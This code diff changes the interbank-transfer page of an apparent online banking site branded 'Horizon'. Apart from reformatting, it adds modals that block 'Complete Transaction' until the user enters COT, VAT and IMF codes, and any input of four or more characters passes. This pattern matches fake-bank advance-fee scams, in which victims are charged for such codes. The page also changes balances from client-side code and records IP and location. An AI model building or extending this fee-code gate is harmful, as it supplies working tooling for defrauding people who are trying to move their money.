@@ -106,35 +106,35 @@ function generateReceipt(options = {}) {
           <span class="font-semibold">Amount:</span><span>${config.currency}${config.amount}</span>
         </div>
         ${parseFloat(config.fees) > 0
-            ? `<div class="flex justify-between text-sm mb-1">
+      ? `<div class="flex justify-between text-sm mb-1">
                   <span class="font-semibold">Fees:</span><span>${config.currency}${config.fees}</span>
                 </div>`
-            : ""
-        }
+      : ""
+    }
         <div class="flex justify-between text-base font-bold border-t border-gray-300 dark:border-gray-700 pt-2">
           <span>Total:</span><span>${config.currency}${config.totalAmount}</span>
         </div>
       </div>
       ${Object.keys(config.additionalFields).length > 0
-            ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
+      ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
                 ${Object.entries(config.additionalFields)
-                    .map(([key, value]) => `
+        .map(([key, value]) => `
                       <div class="flex justify-between text-xs mb-1">
                         <span class="font-semibold">${key}:</span><span>${value}</span>
                       </div>
                     `).join("")}
               </div>`
-            : ""
-        }
+      : ""
+    }
       ${config.showFooter
-            ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
+      ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
                 <div>${config.footerText}</div>
                 <div class="mt-2 text-[11px] text-gray-400 dark:text-gray-500">
                   This is a Horizon-generated receipt
                 </div>
               </div>`
-            : ""
-        }
+      : ""
+    }
     </div>
     `;
 }
@@ -142,6 +142,54 @@ function generateReceiptId() {
   const timestamp = Date.now().toString().slice(-6);
   const random = Math.random().toString(36).substr(2, 4).toUpperCase();
   return `RCP-${timestamp}-${random}`;
+}
+
+// Modal for COT, VAT, IMF
+function showFeeModal(type, onSuccess) {
+  let modal = document.getElementById("fee-modal");
+  if (!modal) {
+    modal = document.createElement("div");
+    modal.id = "fee-modal";
+    document.body.appendChild(modal);
+  }
+  modal.className = "";
+  modal.innerHTML = `
+    <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
+      <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-sm p-6 relative">
+        <button id="close-fee-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
+        <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">
+          <i class="fa fa-credit-card mr-2"></i>Enter ${type} Code
+        </h4>
+        <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">
+          Please enter your ${type} code to proceed.
+        </div>
+        <form id="fee-form" class="space-y-3">
+          <input type="text" name="feeCode" maxlength="8"
+            class="w-full px-3 py-2 border rounded focus:outline-none focus:ring"
+            placeholder="Enter ${type} Code" required />
+          <button type="submit"
+            class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition">
+            <i class="fa fa-check"></i> Validate
+          </button>
+        </form>
+      </div>
+    </div>
+  `;
+  document.getElementById("close-fee-modal").onclick = () => {
+    modal.innerHTML = "";
+    modal.className = "hidden";
+  };
+  document.getElementById("fee-form").onsubmit = async function (e) {
+    e.preventDefault();
+    const code = this.feeCode.value.trim();
+    if (code.length >= 4) {
+      modal.innerHTML = "";
+      modal.className = "hidden";
+      onSuccess();
+    } else {
+      showToast("Invalid code. Please try again.", "error");
+    }
+  };
 }
 
 // UI
@@ -171,16 +219,15 @@ const interbankTransfer = async () => {
   const fmt = (v) =>
     typeof v === "number"
       ? v.toLocaleString("en-US", {
-          style: "currency",
-          currency: "USD",
-          minimumFractionDigits: 2,
-        })
+        style: "currency",
+        currency: "USD",
+        minimumFractionDigits: 2,
+      })
       : v || "$0.00";
 
   function pageEvents() {
     nav.pageEvents?.();
 
-    // Form submit
     document.getElementById("interbank-transfer-form").onsubmit = async function (
       e
     ) {
@@ -224,7 +271,6 @@ const interbankTransfer = async () => {
           return;
         }
 
-        // Show OTP modal immediately
         showOTPModal({
           amount,
           accounttype,
@@ -237,7 +283,6 @@ const interbankTransfer = async () => {
           ipLoc,
         });
 
-        // Fire and forget email sending
         fetch("/api/send-email", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -281,7 +326,6 @@ const interbankTransfer = async () => {
       }
     };
 
-    // OTP Modal
     function showOTPModal(tx) {
       let modal = document.getElementById("otp-modal");
       if (!modal) {
@@ -320,7 +364,6 @@ const interbankTransfer = async () => {
         e.preventDefault();
         const code = this.otp.value.trim();
 
-        // Validate OTP
         const { data: otpRow, error } = await supabase
           .from("otps")
           .select("*")
@@ -336,12 +379,10 @@ const interbankTransfer = async () => {
           return;
         }
 
-        // Show receipt modal with status pending and complete button
         showReceiptModal(tx);
       };
     }
 
-    // Receipt Modal
     function showReceiptModal(tx) {
       let modal = document.getElementById("otp-modal");
       modal.className = "";
@@ -351,34 +392,44 @@ const interbankTransfer = async () => {
             <button id="close-receipt-modal" class="absolute top-3 right-4 text-gray-400 hover:text-red-500 dark:hover:text-white text-2xl font-bold z-10" aria-label="Close">&times;</button>
             <div class="p-6">
               ${generateReceipt({
-                id: generateReceiptId(),
-                date: new Date().toLocaleDateString(),
-                time: new Date().toLocaleTimeString(),
-                amount: tx.amount,
-                currency: '$',
-                description: tx.desc,
-                senderName: tx.profile.full_name,
-                recipientName: tx.accountName,
-                bankName: "",
-                accountNumber: tx.accountNum,
-                transactionType: "Inter-Bank Transfer",
-                status: "Pending",
-                referenceNumber: tx.accountNum,
-                fees: "0.00",
-                totalAmount: tx.amount,
-                additionalFields: {
-                  "IP": tx.ipLoc.ip || "N/A",
-                  "Location": `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`
-                }
-              })}
-              <div class="mt-6 flex justify-center">
-                <button id="complete-interbank-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold">
+        id: generateReceiptId(),
+        date: new Date().toLocaleDateString(),
+        time: new Date().toLocaleTimeString(),
+        amount: tx.amount,
+        currency: '$',
+        description: tx.desc,
+        senderName: tx.profile.full_name,
+        recipientName: tx.accountName,
+        bankName: "",
+        accountNumber: tx.accountNum,
+        transactionType: "Inter-Bank Transfer",
+        status: "Pending",
+        referenceNumber: tx.accountNum,
+        fees: "0.00",
+        totalAmount: tx.amount,
+        additionalFields: {
+          "IP": tx.ipLoc.ip || "N/A",
+          "Location": `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`
+        }
+      })}
+              <div class="mt-6 flex flex-col gap-2 justify-center">
+                <button id="cot-btn" class="bg-yellow-600 text-white px-6 py-2 rounded shadow hover:bg-yellow-700 transition font-semibold">
+                  Enter COT Code
+                </button>
+                <button id="vat-btn" class="bg-blue-600 text-white px-6 py-2 rounded shadow hover:bg-blue-700 transition font-semibold">
+                  Enter VAT Code
+                </button>
+                <button id="imf-btn" class="bg-purple-600 text-white px-6 py-2 rounded shadow hover:bg-purple-700 transition font-semibold">
+                  Enter IMF Code
+                </button>
+                <button id="complete-interbank-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold" disabled>
                   Complete Transaction
                 </button>
               </div>
             </div>
           </div>
         </div>
+        <div id="fee-modal" class="hidden"></div>
         <style>
           .receipt-modal-content::-webkit-scrollbar { width: 8px; background: transparent; }
           .receipt-modal-content::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
@@ -395,12 +446,30 @@ const interbankTransfer = async () => {
           }
         </style>
       `;
+
+      let cotValid = false, vatValid = false, imfValid = false;
+      const enableComplete = () => {
+        const btn = document.getElementById("complete-interbank-btn");
+        btn.disabled = !(cotValid && vatValid && imfValid);
+      };
+
       document.getElementById("close-receipt-modal").onclick = () => {
         modal.innerHTML = "";
         modal.className = "hidden";
       };
+
+      document.getElementById("cot-btn").onclick = () => {
+        showFeeModal("COT", () => { cotValid = true; enableComplete(); showToast("COT code validated.", "success"); });
+      };
+      document.getElementById("vat-btn").onclick = () => {
+        showFeeModal("VAT", () => { vatValid = true; enableComplete(); showToast("VAT code validated.", "success"); });
+      };
+      document.getElementById("imf-btn").onclick = () => {
+        showFeeModal("IMF", () => { imfValid = true; enableComplete(); showToast("IMF code validated.", "success"); });
+      };
+
       document.getElementById("complete-interbank-btn").onclick = async () => {
-        // Complete transaction logic
+        if (!(cotValid && vatValid && imfValid)) return;
         try {
           const amountNum = parseFloat(tx.amount);
           const balanceBefore = parseFloat(tx.account.balance);
@@ -411,7 +480,6 @@ const interbankTransfer = async () => {
             .update({ balance: balanceAfter })
             .eq("id", tx.account.id);
 
-          // Insert transaction
           const { data: txn, error: txnError } = await supabase
             .from("transactions")
             .insert([
@@ -434,7 +502,6 @@ const interbankTransfer = async () => {
             return;
           }
 
-          // Insert notification
           await supabase.from("notifications").insert([
             {
               user_id: tx.profile.id,
@@ -445,7 +512,6 @@ const interbankTransfer = async () => {
             },
           ]);
 
-          // Send receipt email (fire and forget)
           fetch("/api/send-email", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -607,3 +673,7 @@ const interbankTransfer = async () => {
 };
 
 export default interbankTransfer;
+
+
+
+
